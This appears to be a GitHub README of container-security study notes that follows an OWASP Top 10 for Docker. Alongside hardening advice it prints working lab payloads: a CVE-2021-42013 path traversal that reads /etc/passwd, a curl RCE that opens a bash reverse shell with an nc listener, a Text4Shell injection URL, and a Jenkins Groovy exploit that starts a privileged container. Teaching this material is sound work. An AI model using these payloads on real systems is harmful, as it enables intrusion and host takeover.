# Container-Security (Docker & Kubernetes)
## Docker: OWASP Top 10
<details> 
<summary> 1: Host OS Vulnerabilities </summary>
  
- If Host OS have vulnerabilities, attacker can use it to gain access to containers and apps running inside them.
- Resolution: Regular patching of host OS, Usage of IDS, Firewall, Implement strict access controls

#### CVE-2021-42013 (Path Traversal + RCE + Reverse Shell Attack)
- An attacker could use a path traversal attack to map URLs to files outside the directories. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these pathes, this could allow for remote code execution.
- This issue affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
- Path Traversal payload - ``` http://172.17.0.2:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd ```
- Actual payload After double URL decode - ``` http://172.17.0.2:80/cgi-bin/../../../../../../../etc/passwd ```
- Netcat listening on ``` $ nc -lvnp 4444  ```
- RCE Payload: ``` $ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" "http://172.17.0.3:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash" ```
- References: https://github.com/twseptian/cve-2021-42013-docker-lab
</details>

<details> 
<summary> 2: Insecure Container Images </summary>
  
- By compromising the insecure container images, attacker can gain access to applications. 
- Resolution: Implementation of Image Scannings (To identify vulnerabilities) and Signature Validations (to ensure Images are Trusted)
- Best practises: Use minimal base images that conbtain only necessary libraries

#### CVE-2022-42889 (Command Injection)
- The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.
- This issue affects Apache Commons Text versions 1.5 through 1.9.
- Cmd Injection URL Payload - ```https://your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch+%2Ttmp%2Fhelloworld%27%29%7d ```
- Actual payload after decode - ```https://your-target.com/exploit?search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch helloworld')} ```
- After successful execution a file helloworld will be created in app server.
- References: https://github.com/devenes/text4shell-cve-2022-42889
</details>

<details> 
<summary> 3: Insecure Container Configurations </summary>
  
- Misconfigurations may lead to disclose of sensitive date.
- Resolution: Implementation security measures like runtime security amd configuration management.
- Best practises: Implementation of Network segmentation, process isolation and orchestratrion (like kubernetes have default security measures)
- Best Practises: Add necessary access / remove unnecessary access like below examples:
drops capability to modify time -- ``` docker run --cap-drop=SYS_TIME -d my-image ```
Adds Network Bind Service -- ``` docker run --cap-add=NET_BIND_SERVICE -d my-image ```
- Conduct security assessments.
  
### Example: 
- We can set environment variables in Docker file. Setting credentails as Environment variables may disclose them.
</details>


<details> 
<summary> 4: Container Escape Vulnerabilities </summary>
  
- Breaking out from the container is known as "container escape". It allows an attacker to escape from a container to other container or underlying host and gain access to them.
- Option like --privileged may give access to all host systems. It is the same as executing a process with root privileges on the host machine.
``` docker run --privileged -it --name my-container my-image ```
- Resolution: Implementation security measures like runtime security and process isolation
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- Best Practises: Keep containers updated.
- Conduct security assessments.

</details>

<details> 
<summary> 5: Inadequate Process Isolation </summary>
  
- Process running in different conmtainers may interact with each other. 
- This can lead to cross container compromise and data breaches.
- Resolution: Implementation process isolation through Namespace isolation (It Isolates Network, File system) and cgroups (Helps to limit resources that container can consume like CPU, memory, I/O)
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- Use option --pid when starting the container. Process runnin gunder the pid cannot access process on host system. 
``` docker run --pid=container -d my-image ```
- Limit CPU usage when starting container.
``` docker run --cpu-share=512 --memory=512m --memory-swap=1g -d my-image ```  

### Cross Container Compromise with SYS_PTRACE capability
- SYS_PTRACE is a linux kernal process / capability which traces and debugs other process. It can reads / modifies memory, registry and extract sensitive data.

</details>
<details>
<summary> 6: Inadequate Network Segmentation
  
- Can lead to Data exfilteration and unauthorised access.
- Containers are their networks are not properly isolated from eachother.
- Resolution: Implementation of network segmentation will isolate containers from each other.
- Virtual networks will Isolates Network traffic, firewalls controls inbound and Outbound network traffic and security groups will limit network traffic.
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- Use option --network option ```docker run --network=my-network -d my-image```
</details>

<details>
<summary> 7: Inadequate Logging and Monitoring
  
- Logging helps in detecting and resposding to attacks.
- All important events in containers need to be logged.
- Resolution: Collect logs from host system, Conatinerns and orchestration platform.
- Best practises: Use SIEM tools to detect and respond in real-time.
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
</details>

<details>
<summary> 8: Insecure Data Storage in Containers 
  
- May lead to data breaches. Sensitive data maynot be properly secured.
- Resolution: Encrypt sensitive data, use secure storage options like NAS (Network attached Storage) or SAN (Styorage area networks)
- Best practises: Use access controls like RBAC (role-based access control).
- Best practises: Implementation of orchestratrion (like kubernetes have default security measures)
- use option -v , while starting a container, to mount a host directory as a data volume inside a container.
``` docker run -v /data:/data -d my-image ```
- Even after container is deleted, mounted data will be secured in host system.
- Use NAS / SAN as data volume using --mount option. This allows more flexibility to specify the type of mount (like bind, read-only, consistency). 
``` docker run --mount type=bind, source=/data, target=/data -d my-image ```

</details>

### Mounting a Docker Socket (docker.sock)
- Mounting Docker socket will make docker daemon hosts's unix socker available inside the container.
- It allows container to interact with docker host and access docker api to run / manage containers.
- This is a security risk, as container will have full access to docker host. So it need to be done with trusted containers.
- Can use option -v / --mount in docker run command and specify path of docker socket in host and target path inside the container.
- It can start / stop containers, mnodify images, accessing hor file systems.
- If Attacker gain access to this container, he can use mounted docker socket to control docker deamon and take over host system.
- Best practise: Use a seperate container to manage docker deamon.

``` docker run -d -p 8080:8080 --rm -v /var/run/docker.scok:/var/run/docker.sock --name jenkins -t vuln-jenkins:latest ```

 ![image](https://github.com/Vamckis/Container-Security/assets/71128825/03976075-072a-4902-a561-179c2d394388)
 - Creating ngnix container with --privileged option
``` curl -k -4 -X POST "http://localhjost:8080//descriptorByName/org.jenkins.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d 'value=class abcd{abcd(){"docker run -P --rm --privileged --name ngnix".execute()}}' ``` </br>
![image](https://github.com/Vamckis/Container-Security/assets/71128825/a0f2868f-62da-462b-905a-d2d953111f4c)


### References:
- https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities
- https://github.com/ec-council-learning/OWASP-Top-10-for-Docker-Containers-and-Kubernetes-Security
